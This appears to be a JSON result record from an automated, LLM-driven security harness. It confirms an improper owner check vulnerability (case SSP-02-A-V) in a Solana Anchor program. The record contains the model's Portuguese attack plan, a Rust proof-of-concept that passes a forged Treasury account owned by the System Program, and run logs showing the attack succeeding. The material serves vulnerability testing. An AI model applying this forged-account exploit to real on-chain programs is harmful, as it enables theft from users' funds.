@@ -1,0 +1,68 @@
+{
+  "category": "OWNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta forjada com owner diferente foi aceita e usada",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2223,
+        "completion_tokens": 628,
+        "latency_s": 3.3
+      },
+      "raw": "{\n  \"plan\": \"Preparar uma conta Treasury legítima com authority = signer e is_active = true, e também uma conta forjada com o mesmo layout mas dona de outro programa (ex.: System Program). O baseline chama `process` com a conta legítima e deve ter sucesso. O ataque chama `process` com a conta forjada, que não é validada como pertencente ao programa. O efeito mede que a instrução aceitou a conta forjada (program_result Success) e que a conta forjada não foi rejeitada por owner check.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet treasury_key = Pubkey::new_unique();\\nlet fake_treasury_key = Pubkey::new_unique();\\n\\nlet treasury_data = anchor_account_data(\\\"Treasury\\\", &(authority, 100u64, true));\\nlet fake_treasury_data = anchor_account_data(\\\"Treasury\\\", &(authority, 100u64, true));\\n\\nlet treasury_account = account(&env.program_id, &treasury_data, None);\\nlet fake_treasury_account = account(&solana_sdk::system_program::ID, &fake_treasury_data, None);\\nlet authority_account = wallet(1_000_000_000);\\n\\nlet contas_baseline = vec![\\n    (treasury_key, treasury_account.clone()),\\n    (authority, authority_account.clone()),\\n];\\nlet ix_baseline = env.anchor_ix(\\\"process\\\", &(), vec![\\n    AccountMeta::new_readonly(treasury_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet r_base = env.baseline(\\\"process legitimo com treasury valido\\\", &ix_baseline, &contas_baseline);\\n\\nlet contas_ataque = vec![\\n    (fake_treasury_key, fake_treasury_account.clone()),\\n    (authority, authority_account.clone()),\\n];\\nlet ix_ataque = env.anchor_ix(\\\"process\\\", &(), vec![\\n    AccountMeta::new_readonly(fake_treasury_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet r = env.attack(\\\"process com treasury forjado de outro owner\\\", &ix_ataque, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let fake_after = after(&r, &fake_treasury_key);\\n    env.effect(\\\"conta forjada com owner diferente foi aceita e usada\\\", fake_after.owner() != &env.program_id);\\n}\"\n}",
+      "plan": "Preparar uma conta Treasury legítima com authority = signer e is_active = true, e também uma conta forjada com o mesmo layout mas dona de outro programa (ex.: System Program). O baseline chama `process` com a conta legítima e deve ter sucesso. O ataque chama `process` com a conta forjada, que não é validada como pertencente ao programa. O efeito mede que a instrução aceitou a conta forjada (program_result Success) e que a conta forjada não foi rejeitada por owner check.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet treasury_key = Pubkey::new_unique();\nlet fake_treasury_key = Pubkey::new_unique();\n\nlet treasury_data = anchor_account_data(\"Treasury\", &(authority, 100u64, true));\nlet fake_treasury_data = anchor_account_data(\"Treasury\", &(authority, 100u64, true));\n\nlet treasury_account = account(&env.program_id, &treasury_data, None);\nlet fake_treasury_account = account(&solana_sdk::system_program::ID, &fake_treasury_data, None);\nlet authority_account = wallet(1_000_000_000);\n\nlet contas_baseline = vec![\n    (treasury_key, treasury_account.clone()),\n    (authority, authority_account.clone()),\n];\nlet ix_baseline = env.anchor_ix(\"process\", &(), vec![\n    AccountMeta::new_readonly(treasury_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet r_base = env.baseline(\"process legitimo com treasury valido\", &ix_baseline, &contas_baseline);\n\nlet contas_ataque = vec![\n    (fake_treasury_key, fake_treasury_account.clone()),\n    (authority, authority_account.clone()),\n];\nlet ix_ataque = env.anchor_ix(\"process\", &(), vec![\n    AccountMeta::new_readonly(fake_treasury_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet r = env.attack(\"process com treasury forjado de outro owner\", &ix_ataque, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let fake_after = after(&r, &fake_treasury_key);\n    env.effect(\"conta forjada com owner diferente foi aceita e usada\", fake_after.owner() != &env.program_id);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "process legitimo com treasury valido",
+            "result": "Success",
+            "compute_units": 8482,
+            "account_flags": "-r,sr"
+          },
+          {
+            "step": "attack",
+            "note": "process com treasury forjado de outro owner",
+            "result": "Success",
+            "compute_units": 8482,
+            "account_flags": "-r,sr"
+          },
+          {
+            "step": "effect",
+            "note": "conta forjada com owner diferente foi aceita e usada",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8482 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8482 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta forjada com owner diferente foi aceita e usada"
+    }
+  ],
+  "case_id": "SSP-02-A-V",
+  "static_finding": {
+    "category": "OWNER",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Improper Owner Check."
+  }
+}
